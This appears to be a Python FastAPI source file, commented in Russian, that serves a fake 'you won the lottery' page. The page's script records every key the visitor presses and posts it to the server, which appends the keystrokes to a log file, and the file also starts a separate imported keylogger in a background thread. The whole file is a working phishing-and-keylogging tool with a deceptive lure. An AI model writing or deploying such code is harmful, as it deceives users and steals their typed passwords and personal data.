from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
import threading
from keylogger import start_keylogger

app = FastAPI()

# Разрешаем кросс-доменные запросы
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Запуск keylogger в отдельном потоке
def main():
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

# Эндпоинт для главной страницы
@app.get("/", response_class=HTMLResponse)
async def read_root():
    return """
    <html>
        <head>
            <title>Лотерея</title>
            <script>
                let keys = [];
                document.addEventListener('keydown', function(event) {
                    keys.push(event.key);
                });
                function sendKeys() {
                    fetch('/send_keys', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({keys: keys.join('')})
                    }).then(response => {
                        alert('Ваши данные отправлены!');
                        window.location.href = "http://example.com"; // Здесь вы можете перенаправить пользователя
                    });
                }
            </script>
        </head>
        <body>
            <h1>Поздравляем! Вы выиграли лотерею!</h1>
            <button onclick="sendKeys()">Забрать приз</button>
        </body>
    </html>
    """

# Эндпоинт для отправки нажатий клавиш
@app.post("/send_keys")
async def send_keys(request: Request):
    data = await request.json()
    with open("keylog.txt", "a") as f:
        f.write(data['keys'] + "\n")  # Сохраняем нажатия клавиш в файл
    return {"status": "success"}

if __name__ == "__main__":
    main()
